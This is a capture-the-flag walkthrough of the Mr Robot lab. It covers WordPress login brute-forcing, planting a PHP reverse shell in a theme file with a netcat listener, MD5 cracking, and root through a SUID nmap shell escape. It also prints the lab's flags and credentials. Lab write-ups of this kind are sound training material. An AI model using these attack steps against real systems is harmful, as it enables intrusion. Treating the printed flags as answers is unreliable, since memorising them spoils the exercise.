---
Category: Web
LAB: https://tryhackme.com/room/mrrobot
Difficulty: Medium
Featured: yes
aliases:
---

---
# Information / Description

| `Victim IP` | 10.128.141.227 |
| ----------- | -------------- |
![](../../0.%20Assets/Mr%20Robot%20CTF-1784827002475.webp)

---

# Walkthrough

We will first start with an `nmap` as usual, to discover the services on the open ports of the machine:

```
sudo nmap -sS -sV -sC -p- -Pn -n 10.128.141.227 -T5
```

```
Nmap scan report for 10.128.141.227
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https
```

let's leave `ssh` for later so let's start with the webserver

When we enter the webserver we encounter a terminal with different functionalities:

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826373530.webp)

None of them really do anything (Or I couldn't find what to do with them, they are just videos of the `Mr.Robot` series for the most part) so I used `whatweb` to try to understand how the website was made.

```
whatweb http://10.128.141.227
```

```
┌──(marc㉿martin)-[~]
└─$ whatweb http://10.128.141.227/     
http://10.128.141.227/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.128.141.227], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
```

And didn't really find much information, just that is hosted in an `apache` web server.

Next thing I did was to search for `robots.txt` and `sitemap.xml` to see if I could find any relevant information. 

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826532795.webp)

And bingo, we find what looks like a dictionary, we will see what to do with it later and the first flag

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826567665.webp)

```flag1
073403c8a58a1f80d943455fb30724b9
```

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826588953.webp)

We will copy this into a file for later, it might be useful.

And checking `sitemap.xml`

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826790912.webp)

Nothing really

Next thing I did was to read the source code of the webserver to see if I could find any information 

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826829750.webp)

Bingo, this is a `wordpress`

Okay cool, let's first do some manual enumeration and then we will move to automated tools

First thing I did was to search for `/wp-admin` or `/wp-login` to see If we could find a place where we could brute force our way in 

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826925117.webp)

And we where lucky

Let's look in the `wp-content` and see if we find anything.

![](../../0.%20Assets/Mr%20Robot%20CTF-1784826964477.webp)

Seems like directory listing is not enabled

Cool let's use `wpscan` before we brute force the login to see what extra information we get.

Some of the interesting finds are:

- Services

```
[+] The external WP-Cron seems to be enabled: http://10.128.141.227/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299
```

- Version

```
[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.128.141.227/1e82df5.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.128.141.227/1e82df5.html, Match: 'WordPress 4.3.1'
```

- Themes

```
[+] WordPress theme in use: twentyfifteen
 | Location: http://10.128.141.227/wp-content/themes/twentyfifteen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://10.128.141.227/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.2
 | Style URL: http://10.128.141.227/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.128.141.227/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
```

And no plugins for now

I checked the existing exploits with `searchsploit` and found the following

![](../../0.%20Assets/Mr%20Robot%20CTF-1784827280581.webp)

The one that looks interesting is the first one but you have to be authenticated already and the username enumeration one you need to be inside the WordPress as well.

So for now let's try to brute force the login and let's use the wordlist we found before. 

The first thing we will do is to `enumerate users` so we know what users to brute force.

```
wpscan --url http://10.128.141.227/ -e u 
```

In this case we didn't find any

```
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.
```


Something interesting I found was that there is a verbose output for errors, and in this case we know the user `admin` does not exist, so let's perform an brute force with `burp suite` with the dictionary we found and see if any of the users are the correct ones

![](../../0.%20Assets/Mr%20Robot%20CTF-1784828040212.webp)


So set your proxy get the request and send it to the `intruder` , select the position and add the payload position, add the dictionary and start the attack

![](../../0.%20Assets/Mr%20Robot%20CTF-1784828175001.webp)

Then because all the requests are correct, we will look, for a response with a different length (the HTML changes because the error text will change, therefore a different length for the message)

![](../../0.%20Assets/Mr%20Robot%20CTF-1784828253409.webp)

![](../../0.%20Assets/Mr%20Robot%20CTF-1784828309476.webp)

So there we go, we now know the username is `Elliot`

And now for the password we could do the same thing but changing the username to the one we enumerated and selecting the password field as the payload position

![](../../0.%20Assets/Mr%20Robot%20CTF-1784828402976.webp)

But we will use `wpscan` because I don't have the professional edition of burp suite and there is rate limiting so `wpscan` will be faster.
- Note we could also use other tools like `hydra` but for this specific case I like `wpscan`

```
wpscan --url http://10.128.141.227/ -U Elliot -P fsocity.dir
```

And the password is `ER28-0652`

Let's now log into the WordPress

![](../../0.%20Assets/Mr%20Robot%20CTF-1784829948485.webp)

And we logged in as a user with access to the editor which is not good for the company we are going a pentest for

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830091236.webp)

This is because we can change the code into a reverse shell or something like that.

If we look to edit a `.php` file like this one

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830210747.webp)

We will see we can add our `php` code there (reverse shell)

You can use one of the prepared web shells from kali from `/usr/share/webshells/php/`

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830261986.webp)


and in my case I will copy the `php-reverse-shell.php` into my desktop and modify the parameters needed (`ip` and `port`)

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830325004.webp)
![](../../0.%20Assets/Mr%20Robot%20CTF-1784830354660.webp)

And then just upload the changes and update the file

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830423114.webp)

Now set up a listener on the port you specified on the reverse shell

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830454658.webp)

```
nc -nlvp 1234
```

And search for the `php` file in the browser to run the code so we get the `reverse shell`

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830569028.webp)

```
/wp-content/themes/twentyfifteen/archive.php
```

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830584466.webp)

And we have a shell! 

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830629499.webp)
![](../../0.%20Assets/Mr%20Robot%20CTF-1784830646916.webp)

and we find a `second key` and a `md5hash`

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830678536.webp)

we cant open the key so let's crack the hash and see if it's a password we can use to log into another user

![](../../0.%20Assets/Mr%20Robot%20CTF-1784830709703.webp)

Let's user `john` to crack it.

```
john md5-hash.hash --wordlist=fsocity.dir --format=Raw-MD5 
```

![](../../0.%20Assets/Mr%20Robot%20CTF-1784831290646.webp)

```
abcdefghijklmnopqrstuvwxyz
```

So now we use the `ssh` with the credentials we found `robot:abcdefghijklmnopqrstuvwxyz`


![](../../0.%20Assets/Mr%20Robot%20CTF-1784831361630.webp)

And we find the second key

![](../../0.%20Assets/Mr%20Robot%20CTF-1784831380663.webp)

```
822c73956184f694993bede3eb39f959
```

Now for privilege escalation we will look for `SUID` files with

```
find / -type f -perm -4000 2>/dev/null
```

And it finds an extensive list where this file sticks out

```
/usr/local/bin/nmap
```

![](../../0.%20Assets/Mr%20Robot%20CTF-1784831510072.webp)

Doing some research I found this :[gtfobins](https://gtfobins.org/gtfobins/nmap/)

so let's try it

```
/usr/local/bin/nmap --interactive
```

![](../../0.%20Assets/Mr%20Robot%20CTF-1784831591833.webp)
 
 Bingo!

And with this command we spawn a shell

```
!sh
```

![](../../0.%20Assets/Mr%20Robot%20CTF-1784831673194.webp)

![](../../0.%20Assets/Mr%20Robot%20CTF-1784831695117.webp)

and there we go

```
04787ddef27c3dee1ee161b21670b4e4
```